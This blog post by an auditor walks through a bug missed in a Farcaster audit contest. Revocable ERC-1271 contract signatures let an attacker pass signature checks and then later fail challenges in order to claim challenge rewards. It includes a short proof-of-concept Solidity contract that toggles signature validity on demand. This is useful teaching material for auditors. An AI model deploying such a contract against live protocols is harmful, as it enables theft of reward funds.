---
layout: post
title: "Another lesson from Farcaster."
date: 2025-03-08
categories:
---

Studying missed bugs and how to **not miss them again** is a must. This post is about another cool bug I missed during Farcaster contest.

![0.png](/assets/another/0.png)

The code was using OpenZepplin's [SignatureChecker](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ca7a4e39de0860bbaadf95824207886e6de9fa64/contracts/utils/cryptography/SignatureChecker.sol#L15-L29) to check if a particular signature is valid:
```js
function verify(address target, bytes sig ...) public returns (bool) {
  return
@>  SignatureChecker.isValidSignatureNow(
      target,
      sig,
      ...
    )
}
```

Signatures was submitted by a relayer. The system incentives challengers to challenge signatures **validity within a challenge period**, and rewards them for valid challenges. The interesting thing about `isValidSignatureNow()` function is this comment:

> NOTE: Unlike ECDSA signatures, contract signatures are revocable, and the outcome of this function can thus change through time. It could return true at block N and false at block N+1 (or the opposite).

From an attacker perspective, **this is leverage**. It's logic to twist and increase the attack surface. I can write a contract that returns a valid signature for block N (e.g. before challenge period) and an invalid one for block N+1 (e.g. during challenge period). I'm not sure if this is what we call a honeypot but this is def a sweet issue. With this leverage, the attacker starts to ask questions:

1. Can we set `target` as a contract address? Turns out yes.
2. What's the worse impact we cause? Turns out we can get challenge reward.

This is the contract used in one of the PoCs, simple and sweet:

```js
pragma solidity ^0.8.0;

interface IERC1271 {
  /**
    * @dev Should return whether the signature provided is valid for the provided data
    * @param hash      Hash of the data to be signed
    * @param signature Signature byte array associated with `hash`
    */
  function isValidSignature(bytes32 hash, bytes memory signature) external view returns (bytes4 magicValue);
}

contract FarcasterContractUser is IERC1271 {
  bool public isOn;

  constructor() payable {
      isOn = true;
  }

  function signatureSwitch(bool _isOn) public {
      isOn = _isOn;
  }

  function isValidSignature(bytes32 hash, bytes memory signature) public view returns (bytes4 magicValue) {
      if (isOn) {
          return IERC1271.isValidSignature.selector;
      } else {
          return 0xffffffff;
      }
  }

  fallback() external payable {}
}
```
